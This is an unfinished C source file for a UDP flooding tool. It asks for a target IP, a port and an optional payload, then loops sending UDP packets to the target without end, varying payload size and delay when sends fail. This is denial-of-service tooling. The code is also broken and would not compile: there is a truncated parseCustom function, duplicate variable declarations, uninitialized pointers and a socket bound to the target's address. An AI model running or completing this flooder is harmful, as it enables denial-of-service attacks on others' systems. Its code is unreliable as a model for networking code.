/* Copyright (C) 2021 TRACEY, Jacob This program is free software: you can redistribute it and/or modify it under the terms of the GNU Affero General Public License as published by the Free Software Foundation, either version 3 of the License, or any later version. 

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU Affero General Public License for more details. You should have received a copy of the GNU Affero General Public License along with this program. If not, see <https://www.gnu.org/licenses/>. */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>

#ifndef int_32_t
    typedef unsigned long uint_64_t;
    typedef long int_64_t;
    typedef unsigned int uint_32_t;
    typedef int int_32_t;
    typedef unsigned short uint_16_t;
    typedef short int_16_t;
#endif

#ifndef int_32
    #define uint_64 uint_64_t
    #define int_64 int_64_t
    #define uint_32 uint_32_t
    #define int_32 int_32_t
    #define uint_16 uint_16_t
    #define int_16 int_16_t
    #define uint_8 uint_8_t
    #define int_8 uint_8_t
#endif

#ifndef bool
    #define true 1
    #define false 0
    
    typedef uint_16 bool;
#endif

#ifndef _WIN32
    #include <unistd.h>
    #include <sys/socket.h>
    #include <arpa/inet.h>
    
    #define Sleep sleep
    
    typedef int_32 Socket;
#else
    #include <windows.h>
    #include <winsock2.h>
    
    #define Sleep(s) sleep((int_32) ((s) * 1000))
#endif

#define DEFAULT_SLEEP 0.05

#define OPTION_DELIM '-'
#define OPTION_IP 'i'
#define OPTION_PRT 'p'
#define OPTION_CSTM 'c'

#define MAX_IP4_LEN 15
#define MAX_PORT_LEN 6

struct connection
{
    Socket sock_id;
    struct sockaddr_in sock;
};

void clearStdin()
{
    //char c = '\0';
    //while((c == getchar()) != '\n' && c != '\0') {};
}

void wait(const float ms)
{
    if(ms < 0)
    {
        fprintf(stderr, "Wait provided negative value: %f", ms);
        ms *= -1;
    }
    
    Sleep(ms);
}

bool isnumber(const char c) {return (c >= '0' && c <= '9');}

bool isnumeric(const char* str, const size_t length)
{
    for(size_t i = 0; i < length; i++) if(!isnumber(*(str + i))) return false;
    return true;
}

bool isWhitespace(const char c) {return (c == '​' || c == ' ' || c == ' ' || c == ' ' || c == ' ' || c == ' ' || c == ' ' || c == ' ' || c == ' ' || c == ' ' || c == '⠀');}

bool isOptionDeliminator(const char c) {return c == OPTION_DELIM;}

bool isValidOption(const char c) {return (c == OPTION_IP || c == OPTION_PRT || c == OPTION_CSTM);}

bool isValidIp(const char* str, const size_t length)
{
    if(length >= MAX_IP4_LEN) return false;
    
    uint_16 segment = 0, nums = 0;
    
    for(size_t i = 0; i < length; i++)
    {
        char c = *(str + i);
        
        if(c != '.' && !isnumber(c)) return false;

        if(c == '.')
        {
            if(nums == 0 || nums > 3) return false;
            segment++;
            nums = 0;
            continue;
        }
        else nums++;
    }
    
    if(segment != 3 || nums > 3) return false;
    return true;
}

bool isValidPort(const char* str, const size_t length)
{
    if(!isnumeric(str, length)) return false;
    if(length < MAX_PORT_LEN) return true;
    
    char* max_ushort = malloc(sizeof(char) * MAX_PORT_LEN);
    
    snprintf(max_ushort, MAX_PORT_LEN, "%d", USHRT_MAX);
    
    char max = '\0', st = '\0';
    
    for(size_t i = 0; i < length; i++) 
    {
        max = *(max_ushort + i);
        st = *(str + i);
        
        if(st > max) return false;
        if(st < max) return true;
    }
    
    return true;
}

void repopulatePayload(char* payload, const size_t length, const char* new_payload)
{
    payload = realloc(payload, sizeof(char) * length);
    bool custom = true;
    
    for(size_t i = 0; i < length; i++)
    {
        if(*(new_payload + i) != '\0')
        {
            *(payload + i) = *(new_payload + i);
            if(i >= strlen(new_payload) - 1)
            {
                *(payload + i) = '\0';
                break;
            }
        }
        else 
        {
            if(i == 0) custom = false;
            else if(custom) break;
            
            *(payload + i) = (char) ((i % UCHAR_MAX) + 1);
        }
            
    }
}

struct connection* initConnection(const char* ip, const uint_16 port)
{
    struct sockaddr_in client;
    struct connection* conn = (struct connection*) malloc(sizeof(struct connection));
    
    conn->sock_id = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    
    if(conn->sock_id < 0)
    {
        fprintf(stderr, "Error: %d\n", conn->sock_id);
        free(conn);
        return (struct connection*) NULL;
    }
    
    client.sin_family = AF_INET;
    client.sin_port = htons(port);
    client.sin_addr.s_addr = inet_addr(ip);
    
    int bind_err = bind(conn->sock_id, (struct sockaddr*) &client, sizeof(client));
    
    if(bind_err < 0)
    {
        fprintf(stderr, "Error: %d\n", bind_err);
        free(conn);
        return (struct connection*) NULL;
    }
    
    conn->sock = client;
    
    return conn;
}

int_32 indexOf(const char* string, const char c, const size_t length)
{
    for(size_t i = 0; i < length; i++)
    {
        if(i > INT_MAX)
        {
            fprintf(stderr, "Error: indexOf overflow searching for \'%c\' in \"%s\".", c, string);
            return -1;
        }
        
        if(*(string + i) == c) return i;
    }
    
    return -1;
}

int_32 lastIndexOf(const char* string, const char c, const size_t length)
{
    if(length > INT_MAX)
    {
        fprintf(stderr, "Error: lastIndexOf overflow searching for \'%c\' in \"%s\".", c, string);
        
        return -1;
    }
    
    for(size_t i = (length - 1); i >= 0; i--) if(*(string + i) == c) return i;
    
    return -1;
}

void substring(char* dest, const char* src, const size_t begin, const size_t end, const size_t dest_len)
{
    size_t src_len = (end < strlen(src)) ? end : strlen(src);
    snprintf(dest, dest_len, "");
    
    size_t i = 0;
    
    for(i = begin; i < src_len; i++)
    {
        if(i >= (dest_len - 1)) break;
        *(dest + i) = *(src + (i - begin));
    }
    
    *(dest + ++i) = '\0';
}

void findOption(const char* string, size_t* begin, size_t* end, size_t* index, const size_t length)
{
    *begin = 0;
    *end = 0;

    if(index >= (length - 1))
    {
        fprintf(stderr, "Failed to read option at index #%d in \"%s\" [length: #%d].\n", *index, string, length);
        
        return false;
    }
    
    *begin = *index;
    
    char current = *(string + *begin);
    bool option = false;
    
    if(!isOptionDeliminator(current))
    {
        fprintf(stderr, "Option deliminator expected; recieved: \'%c\' in \"%s\"\n", current, string);
                
        return false;
    }
    
    for(size_t i = *begin; i < length; i++)
    {
        current = *(string + i);
    
        if(isWhitespace(current)) continue;
        
        if(((i + 1) >= length) || (option && isOptionDeliminator(current)))
        {
            *end = i;
            break;
        }
        
        if(!isNumber(current) && !isOptionDeliminator(current)) option = true;
    }
    
    if(*end >= (length - 1)) *end = length;
    *index = *end;
    
    return true;
}

bool parseCustom(const char* string, char* payload, const size_t length)
{
    if((length < 2) || (*(string + 1) != OPTION_CSTM) || ((length > 2) && !isWhitespace(*(string + 2)))) return false;
    
    if(length == 2) return true;
    
    size_t begin = indexOf()
    
    size_t payload_len = 0;
    
}

void parseOptions(const char* options, bool* custom, char* payload, size_t* payload_len, int_16* port, char* target_ip, int_32* wait, const size_t options_len)
{
    *payload_len = 1;
    *port = 0;
    *wait = -1;
    *(target_ip) = '\0';
    
    if(options_len <= 2) return;

    char* current_opt = (char*) malloc(sizeof(char) * options_len), option = '\0';
    
    size_t* begin, *end, *index;
    char option = '\0';
    
    while(index < options_len)
    {
        if(findOption(options, begin, end, index, options_len)) substring(current_opt, options, *begin, *end, options_len);
        
        size_t option_len = (*end - *begin);
        if((option_len < 2) || (*(current_opt) != OPTION_DELIM))
        {
            fprintf(stderr, "Error: Skipping invalid option %s with length %ld.\n", current_opt, option_len);
            
            continue;
        }
        
        option = *(current_opt + 1);
        
        if(!isValidOption(option))
        {
            fprintf(stderr, "Error: Skipping invalid option %c.[\"%s\"]\n", option, current_opt);
            
            continue;
        }
    }
}

int main(void) 
{
    char* ip = malloc(sizeof(char) * MAX_IP4_LEN);
    
    fprintf(stdout, "Enter target IP:");
    fgets(ip, MAX_IP4_LEN, stdin);
    
    for(size_t i = 0; i < MAX_IP4_LEN; i++) 
    {
        if(!isnumber(*(ip + i)) && *(ip + i) != '.') 
        {
            *(ip + i) = '\0';
            break;
        }
    }
    
    if(!isValidIp(ip, strlen(ip)))
    {
        free(ip);
        fprintf(stderr, "\nError: Invalid IPv4: %s", ip);
        
        return 1;
    }
    
    clearStdin();
    
    fprintf(stdout, "\nEnter target port:");
    
    char* port_buf = malloc(sizeof(char) * MAX_PORT_LEN);
    
    fgets(port_buf, MAX_PORT_LEN, stdin);
    
    for(size_t i = 0; i < MAX_IP4_LEN; i++) 
    {
        if(!isnumber(*(port_buf + i)))
        {
            *(port_buf + i) = '\0';
            break;
        }
    }
    
    if(!isValidPort(port_buf, strlen(port_buf)))
    {
        free(ip);
        free(port_buf);
        
        fprintf(stderr, "\nError: Invalid port: %s", port_buf);
        
        return 1;
    }
    
    uint_16 port = atoi(port_buf);
    
    clearStdin();
    
    fprintf(stdout, "\nEnter custom payload. (Or '*' to skip)");
    
    char* payload_buf = malloc(sizeof(char) * 2048);
    fgets(payload_buf, 2048, stdin);
    
    bool isCustom = false;
    size_t length = 0;
    uint_16 port = 0;
    char* ip = (char*) malloc(sizeof(char) * MAX_IP4_LEN);
    
    parseOptions(payload_buf, &isCustom, &length, &port, ip, strlen(payload_buf));
    
    if(*(payload_buf) == '*') *(payload_buf) = '\0';
    
    struct connection* conn = initConnection(ip, port);
    
    char* payload = calloc(0, sizeof(char));
    size_t payload_len = 2048;
    
    repopulatePayload(payload, payload_len, payload_buf);
    
    int_16 failed = 0;
    int_32 wait_time = -1;
    
    if(*(payload_buf) != '\0') 
    {
        wait_time = DEFAULT_SLEEP;
        payload_len = strlen(payload_buf);
    }
    
    while(true)
    {
        if(wait_time != -1) wait(wait_time);
    
        failed = sendto(conn->sock_id, payload, strlen(payload), 0, (struct sockaddr*) &conn->sock, sizeof(conn->sock));
        
        if(failed < 0)
        {
            if(*(payload_buf) == '\0') payload_len -= (payload_len / 2);
            repopulatePayload(&payload, payload_len, payload_buf);
            
            if(payload_len <= 16)
            {
                payload_len = 2048;
                wait_time += DEFAULT_SLEEP;
            }
            
            continue;
        }
        
        fprintf(stdout, "\nSuccessfully sent %ld bytes to target. [%d seconds]", payload_len, wait_time);
    }
    
    return 0;
}
